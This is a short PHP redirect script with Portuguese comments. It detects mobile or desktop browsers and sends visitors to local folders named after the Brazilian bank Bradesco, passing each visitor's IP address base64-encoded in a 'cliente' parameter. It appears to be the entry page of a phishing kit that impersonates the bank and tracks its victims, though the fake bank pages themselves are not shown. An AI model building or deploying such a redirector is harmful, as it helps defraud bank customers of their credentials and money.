<?php
 
// verificar se o dispositivo é móvel ou desktop
$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
$symbian = strpos($_SERVER['HTTP_USER_AGENT'],"Symbian");
$windowsphone = strpos($_SERVER['HTTP_USER_AGENT'],"Windows Phone");
 
if ($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian || $windowsphone == true) {
   $dispositivo = "mobile";
 }
 
else { $dispositivo = "computador";}
 
// Definindo as ações para dispositivos móveis, desktop e para todos dispositivos
 
//Se for um dispositivo móvel
if ($dispositivo == "mobile") {
	$ip = $_SERVER['REMOTE_ADDR'];
header('Location: ./bradesco/mobile/?cliente=' . base64_encode($ip . 'mobile@uol.com.br'));
}

//Se for um computador
if ($dispositivo == "computador") {
	$ip = $_SERVER['REMOTE_ADDR'];
	header('Location: ./bradesco/html/?cliente=' . base64_encode($ip . '@desktop.com.br'));
}

//Em todos aparelhos
echo "<h1> Sem o seletor, apareço em qualquer aparelho </h1>";
echo "bla bla bla bla bla ...";

?>  